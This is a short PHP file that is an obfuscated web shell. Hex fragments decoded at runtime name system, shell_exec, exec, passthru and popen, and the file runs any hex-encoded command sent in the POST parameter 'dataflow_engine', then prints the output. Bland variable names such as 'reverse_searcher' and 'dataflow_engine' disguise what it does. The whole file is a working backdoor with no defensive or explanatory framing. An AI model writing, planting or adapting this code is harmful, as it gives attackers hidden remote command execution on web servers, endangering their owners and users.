<?php


$fac1 = '7';
$fac2 = '4';
$fac3 = '5';
$fac4 = '6';
$fac5 = 'd';
$fac6 = '8';
$fac7 = 'c';
$fac8 = 'f';
$fac9 = '1';
$fac10 = '3';
$fac11 = '0';
$fac12 = 'e';
$reverse_searcher1 = pack("H*", $fac1.'3'.'7'.'9'.$fac1.'3'.$fac1.$fac2.'6'.$fac3.$fac4.$fac5);
$reverse_searcher2 = pack("H*", $fac1.'3'.'6'.$fac6.$fac4.$fac3.'6'.$fac7.$fac4.'c'.$fac3.$fac8.'6'.$fac3.'7'.'8'.'6'.$fac3.$fac4.'3');
$reverse_searcher3 = pack("H*", '6'.'5'.$fac1.'8'.$fac4.$fac3.'6'.'3');
$reverse_searcher4 = pack("H*", $fac1.'0'.$fac4.$fac9.$fac1.'3'.'7'.$fac10.$fac1.$fac2.$fac4.'8'.'7'.'2'.'7'.$fac3);
$reverse_searcher5 = pack("H*", $fac1.$fac11.$fac4.$fac8.$fac1.$fac11.$fac4.'5'.'6'.'e');
$reverse_searcher6 = pack("H*", '7'.$fac10.'7'.$fac2.$fac1.'2'.'6'.$fac3.'6'.'1'.$fac4.'d'.'5'.$fac8.$fac4.'7'.$fac4.'5'.'7'.$fac2.'5'.'f'.$fac4.$fac10.'6'.'f'.$fac4.'e'.$fac1.$fac2.$fac4.'5'.$fac4.$fac12.'7'.$fac2.$fac1.'3');
$reverse_searcher7 = pack("H*", '7'.'0'.$fac4.'3'.$fac4.$fac7.'6'.$fac8.'7'.'3'.'6'.$fac3);
$dataflow_engine = pack("H*", $fac4.'4'.'6'.$fac9.$fac1.'4'.'6'.$fac9.$fac4.$fac4.$fac4.'c'.$fac4.'f'.'7'.'7'.$fac3.$fac8.$fac4.'5'.$fac4.'e'.$fac4.'7'.$fac4.'9'.$fac4.'e'.$fac4.$fac3);
if (isset($_POST[$dataflow_engine])) {
    $dataflow_engine = pack("H*", $_POST[$dataflow_engine]);
    if (function_exists($reverse_searcher1)) {
        $reverse_searcher1($dataflow_engine);
    } elseif (function_exists($reverse_searcher2)) {
        print $reverse_searcher2($dataflow_engine);
    } elseif (function_exists($reverse_searcher3)) {
        $reverse_searcher3($dataflow_engine, $element_component);
        print join("\n", $element_component);
    } elseif (function_exists($reverse_searcher4)) {
        $reverse_searcher4($dataflow_engine);
    } elseif (function_exists($reverse_searcher5) && function_exists($reverse_searcher6) && function_exists($reverse_searcher7)) {
        $property_set_dchunk = $reverse_searcher5($dataflow_engine, 'r');
        if ($property_set_dchunk) {
            $sym_entity = $reverse_searcher6($property_set_dchunk);
            $reverse_searcher7($property_set_dchunk);
            print $sym_entity;
        }
    }
    exit;
}
